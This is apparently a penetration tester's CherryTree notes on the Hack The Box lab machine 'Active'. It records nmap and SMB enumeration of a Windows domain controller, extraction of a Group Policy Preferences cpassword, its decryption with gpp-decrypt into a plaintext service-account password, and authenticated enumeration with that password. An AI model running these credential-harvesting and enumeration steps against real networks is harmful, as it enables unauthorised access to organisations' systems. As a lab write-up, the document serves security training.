<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="10.10.10.100" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1675519371">
    <rich_text>IP :10.10.10.100
Hostname:
OS:





Linux Proof: </rich_text>
    <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
    <rich_text>
Windows Proof: </rich_text>
    <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
    <rich_text>
</rich_text>
    <node name="Log Book" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="20" is_bold="1" foreground="" ts_creation="0" ts_lastsave="1697241065">
      <node name="Nmap" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697229881" ts_lastsave="1697230200">
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


we see the  domain </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
so we update the /etc/hosts file


</rich_text>
        <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">./nmapScanTCP.sh 10.10.10.100 HTB/ActiveDirectory101/Active/nmap/nmap_AllTCP.log
USAGE: ./nmapScanTCP.sh &lt;inputip&gt; &lt;outputfile&gt;

the ports found are: 53,88,135,139,389,445,464,593,636,3268,3269,5722,49152,49153,49154,49155,49157,49158,49165,49168,49169
HTB/ActiveDirectory101/Active/nmap/nmap_AllTCP.log
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-13 16:28 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
Initiating NSE at 16:28
Completed NSE at 16:28, 0.00s elapsed
Initiating Ping Scan at 16:28
Scanning 10.10.10.100 [2 ports]
Completed Ping Scan at 16:28, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:28
Completed Parallel DNS resolution of 1 host. at 16:28, 0.00s elapsed
Initiating Connect Scan at 16:28
Scanning 10.10.10.100 (10.10.10.100) [21 ports]
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 49169/tcp on 10.10.10.100
Discovered open port 3268/tcp on 10.10.10.100
Discovered open port 49165/tcp on 10.10.10.100
Discovered open port 3269/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 49168/tcp on 10.10.10.100
Discovered open port 5722/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Completed Connect Scan at 16:28, 0.22s elapsed (21 total ports)
Initiating Service scan at 16:28
Scanning 21 services on 10.10.10.100 (10.10.10.100)
Service scan Timing: About 61.90% done; ETC: 16:30 (0:00:34 remaining)
Completed Service scan at 16:29, 66.04s elapsed (21 services on 1 host)
NSE: Script scanning 10.10.10.100.
Initiating NSE at 16:29
Completed NSE at 16:29, 10.69s elapsed
Initiating NSE at 16:29
Completed NSE at 16:29, 4.97s elapsed
Initiating NSE at 16:29
Completed NSE at 16:29, 0.00s elapsed
Nmap scan report for 10.10.10.100 (10.10.10.100)
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-13 20:28:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-10-13T20:29:37
|_  start_date: 2023-10-13T19:36:43
|_clock-skew: -2s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
Initiating NSE at 16:29
Completed NSE at 16:29, 0.00s elapsed
Initiating NSE at 16:29
Completed NSE at 16:29, 0.00s elapsed
Initiating NSE at 16:29
Completed NSE at 16:29, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.77 seconds
</codebox>
        <codebox char_offset="24" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">active.htb</codebox>
      </node>
      <node name="SMB" unique_id="102" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697230313" ts_lastsave="1697233450">
        <rich_text>since we see smb there lets run smb map

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


we see that </rich_text>
        <rich_text family="monospace">Replication</rich_text>
        <rich_text> folder is readonly


we copy everything




we find a file with credentials

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


username: </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
 cpassword=</rich_text>
        <rich_text foreground="#5ebdab">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</rich_text>
        <rich_text>

the cpassword looks encrypted on some googling  i found
 
  </rich_text>
        <rich_text link="webs https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</rich_text>
        <rich_text>
  
  which can be decrypted by Microsoft published AES Private key on MSDN: </rich_text>
        <rich_text link="webs https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx">https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx</rich_text>
        <rich_text> 


we can decrypt it using the utlitiy in kali called gppdecrypt

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

and get the password
password: </rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <codebox char_offset="41" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ActiveDirectory101  smbmap -H 10.10.10.100

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
</codebox>
        <codebox char_offset="146" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"&gt;&lt;User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"&gt;&lt;Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/&gt;&lt;/User&gt;
&lt;/Groups&gt;</codebox>
        <codebox char_offset="160" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">active.htb\SVC_TGS</codebox>
        <codebox char_offset="579" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</codebox>
        <codebox char_offset="613" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GPPstillStandingStrong2k18</codebox>
      </node>
      <node name="Enum4linux" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697230905" ts_lastsave="1697237452">
        <rich_text justification="left"></rich_text>
        <rich_text>



then with the user 

</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="0" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">enum4linux -a 10.10.10.100 | tee enum4linux.log
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Oct 13 16:50:55 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.10.100
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.10.100 )============================


[E] Can't find workgroup/domain
                                                                                                                                                                            
                                                                                                                                                                            

 ================================( Nbtstat Information for 10.10.10.100 )================================
                                                                                                                                                                            
^GLooking up status of 10.10.10.100                                                                                                                                         
No reply from 10.10.10.100

 ===================================( Session Check on 10.10.10.100 )===================================
                                                                                                                                                                            
                                                                                                                                                                            
[+] Server 10.10.10.100 allows sessions using username '', password ''                                                                                                      
                                                                                                                                                                            
                                                                                                                                                                            
 ================================( Getting domain SID for 10.10.10.100 )================================
                                                                                                                                                                            
do_cmd: Could not initialise lsarpc. Error was NT_STATUS_ACCESS_DENIED                                                                                                      

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                        
                                                                                                                                                                            
                                                                                                                                                                            
 ===================================( OS information on 10.10.10.100 )===================================
                                                                                                                                                                            
                                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                                        
                                                                                                                                                                            
                                                                                                                                                                            
[+] Got OS info for 10.10.10.100 from srvinfo:                                                                                                                              
        10.10.10.100   Wk Sv PDC Tim NT     Domain Controller                                                                                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b


 =======================================( Users on 10.10.10.100 )=======================================
                                                                                                                                                                            
                                                                                                                                                                            
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                        
                                                                                                                                                                            
                                                                                                                                                                            

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                         
                                                                                                                                                                            
                                                                                                                                                                            
 =================================( Share Enumeration on 10.10.10.100 )=================================
                                                                                                                                                                            
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100                                                                                                                                
                                                                                                                                                                            
//10.10.10.100/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                           
//10.10.10.100/C$       Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/IPC$     Mapping: OK Listing: DENIED Writing: N/A
//10.10.10.100/NETLOGON Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Replication      Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/SYSVOL   Mapping: DENIED Listing: N/A Writing: N/A
//10.10.10.100/Users    Mapping: DENIED Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.10.100 )============================
                                                                                                                                                                            
                                                                                                                                                                            
[E] Unexpected error from polenum:                                                                                                                                          
                                                                                                                                                                            
                                                                                                                                                                            

[+] Attaching to 10.10.10.100 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.100)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)



[E] Failed to get password policy with rpcclient                                                                                                                            
                                                                                                                                                                            
                                                                                                                                                                            

 =======================================( Groups on 10.10.10.100 )=======================================
                                                                                                                                                                            
                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                 
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                                     
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                                  
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                                       
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                                 
                                                                                                                                                                            
                                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                                      
                                                                                                                                                                            
                                                                                                                                                                            
 ==================( Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                            
                                                                                                                                                                            
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                   
                                                                                                                                                                            
                                                                                                                                                                            
 ===============================( Getting printer info for 10.10.10.100 )===============================
                                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                                     


enum4linux complete on Fri Oct 13 16:51:44 2023
</codebox>
        <codebox char_offset="26" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> enum4linux -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -a 10.10.10.100 | tee enum4lin_SVC_TGS.log
</codebox>
        <codebox char_offset="30" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
                                                                                                                                                                            
 Active  smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.100:445        Name: active.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
                                                                                                                                                                            
 Active  
                                                                                                                                                                            
 Active  smbclient //10.10.10.100/Users -U SVC_TGS
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                5217023 blocks of size 4096. 279400 blocks available
smb: \&gt; ^C
                                                                                    
 Active  ls
DirectoryBF  Exploits  SMB            Writeup.ctd   Writeup.ctd~~
enum4linux   nmap      SubdomainEnum  Writeup.ctd~  Writeup.ctd~~~
                                                                                    
 Active  cd enum4linux
                                                                                    
 enum4linux  ;s
s: command not found
                                                                                    
 enum4linux  ls
enum4linux.log
                                                                                    
 enum4linux  enum4linux -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -a 10.10.10.100 | tee enum4lin_SVC_TGS.log
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Oct 13 18:14:46 2023

 =========================================( Target Information )=========================================                                                               
                                                                                    
Target ........... 10.10.10.100                                                     
RID Range ........ 500-550,1000-1050
Username ......... 'SVC_TGS'
Password ......... 'GPPstillStandingStrong2k18'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.10.100 )============================                                                               
                                                                                    
                                                                                    
[E] Can't find workgroup/domain                                                     
                                                                                    
                                                                                    

 ================================( Nbtstat Information for 10.10.10.100 )================================                                                               
                                                                                    
Looking up status of 10.10.10.100                                                   
No reply from 10.10.10.100

 ===================================( Session Check on 10.10.10.100 )===================================                                                                
                                                                                    
                                                                                    
[+] Server 10.10.10.100 allows sessions using username 'SVC_TGS', password 'GPPstillStandingStrong2k18'                                                                 
                                                                                    
                                                                                    
 ================================( Getting domain SID for 10.10.10.100 )================================                                                                
                                                                                    
Domain Name: ACTIVE                                                                 
Domain Sid: S-1-5-21-405608879-3187717380-1996298813

[+] Host is part of a domain (not a workgroup)                                                                                                                              
                                                                                                                                                                            
                                                                                                                                                                            
 ===================================( OS information on 10.10.10.100 )===================================
                                                                                                                                                                            
                                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                                        
                                                                                                                                                                            
                                                                                                                                                                            
[+] Got OS info for 10.10.10.100 from srvinfo:                                                                                                                              
        10.10.10.100   Wk Sv PDC Tim NT     Domain Controller                                                                                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x80102b


 =======================================( Users on 10.10.10.100 )=======================================
                                                                                                                                                                            
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain                                
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS        Name: SVC_TGS   Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]

 =================================( Share Enumeration on 10.10.10.100 )=================================
                                                                                                                                                                            
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.100                                                                                                                                
                                                                                                                                                                            
//10.10.10.100/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                           
//10.10.10.100/C$       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                              
                                                                                                                                                                            
NT_STATUS_INVALID_PARAMETER listing \*                                                                                                                                      
//10.10.10.100/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//10.10.10.100/NETLOGON Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/Replication      Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/SYSVOL   Mapping: OK Listing: OK Writing: N/A
//10.10.10.100/Users    Mapping: OK Listing: OK Writing: N/A

 ============================( Password Policy Information for 10.10.10.100 )============================
                                                                                                                                                                            
                                                                                                                                                                            

[+] Attaching to 10.10.10.100 using SVC_TGS:GPPstillStandingStrong2k18

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.100)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] ACTIVE
        [+] Builtin

[+] Password Info for Domain: ACTIVE

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes 
        [+] Password Complexity Flags: 000001

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 1

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                                                        
                                                                                                                                                                            
                                                                                                                                                                            
Password Complexity: Enabled                                                                                                                                                
Minimum Password Length: 7


 =======================================( Groups on 10.10.10.100 )=======================================
                                                                                                                                                                            
                                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                                 
                                                                                                                                                                            
group:[Server Operators] rid:[0x225]                                                                                                                                        
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]

[+]  Getting builtin group memberships:                                                                                                                                     
                                                                                                                                                                            
Group: Windows Authorization Access Group' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS                                                                
Group: IIS_IUSRS' (RID: 568) has member: NT AUTHORITY\IUSR
Group: Administrators' (RID: 544) has member: ACTIVE\Administrator
Group: Administrators' (RID: 544) has member: ACTIVE\Enterprise Admins
Group: Administrators' (RID: 544) has member: ACTIVE\Domain Admins
Group: Guests' (RID: 546) has member: ACTIVE\Guest
Group: Guests' (RID: 546) has member: ACTIVE\Domain Guests
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: NT AUTHORITY\Authenticated Users
Group: Users' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group: Users' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group: Users' (RID: 545) has member: ACTIVE\Domain Users

[+]  Getting local groups:                                                                                                                                                  
                                                                                                                                                                            
group:[Cert Publishers] rid:[0x205]                                                                                                                                         
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:                                                                                                                                       
                                                                                                                                                                            
Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\krbtgt                                                                                         
Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Domain Controllers
Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Schema Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Enterprise Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Cert Publishers
Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Domain Admins
Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Group Policy Creator Owners
Group: Denied RODC Password Replication Group' (RID: 572) has member: ACTIVE\Read-only Domain Controllers

[+]  Getting domain groups:                                                                                                                                                 
                                                                                                                                                                            
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]                                                                                                                 
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]

[+]  Getting domain group memberships:                                                                                                                                      
                                                                                                                                                                            
Group: 'Domain Admins' (RID: 512) has member: ACTIVE\Administrator                                                                                                          
Group: 'Group Policy Creator Owners' (RID: 520) has member: ACTIVE\Administrator
Group: 'Domain Controllers' (RID: 516) has member: ACTIVE\DC$
Group: 'Domain Users' (RID: 513) has member: ACTIVE\Administrator
Group: 'Domain Users' (RID: 513) has member: ACTIVE\krbtgt
Group: 'Domain Users' (RID: 513) has member: ACTIVE\SVC_TGS
Group: 'Schema Admins' (RID: 518) has member: ACTIVE\Administrator
Group: 'Domain Guests' (RID: 514) has member: ACTIVE\Guest
Group: 'Enterprise Admins' (RID: 519) has member: ACTIVE\Administrator

 ==================( Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                                            
                                                                                                                                                                            
[I] Found new SID:                                                                                                                                                          
S-1-5-21-405608879-3187717380-1996298813                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-21-405608879-3187717380-1996298813                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-32                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-32                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-32                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-32                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-32                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-32                                                                                                                                                                    

[I] Found new SID:                                                                                                                                                          
S-1-5-32                                                                                                                                                                    

[+] Enumerating users using SID S-1-5-80 and logon username 'SVC_TGS', password 'GPPstillStandingStrong2k18'                                                                
                                                                                                                                                                            
                                                                                                                                                                            
[+] Enumerating users using SID S-1-5-21-405608879-3187717380-1996298813 and logon username 'SVC_TGS', password 'GPPstillStandingStrong2k18'                                
                                                                                                                                                                            
